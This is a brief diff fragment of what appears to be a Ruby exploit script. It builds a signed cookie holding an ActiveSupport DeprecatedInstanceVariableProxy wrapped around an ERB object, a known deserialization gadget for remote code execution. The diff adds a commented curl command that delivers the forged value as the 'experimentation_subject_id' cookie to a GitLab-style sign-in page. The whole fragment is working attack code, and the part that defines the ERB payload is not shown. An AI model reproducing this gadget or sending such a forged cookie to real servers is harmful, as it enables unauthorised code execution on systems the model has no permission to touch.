@@ -12,4 +12,5 @@ depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :res
 cookies.signed[:cookie] = depr
 puts cookies[:cookie]
 
+# curl -vvv --cacert cert.pem 'https://git.domain.xyz/users/sign_in' -b "experimentation_subject_id=FORGED_COOKIE"
 
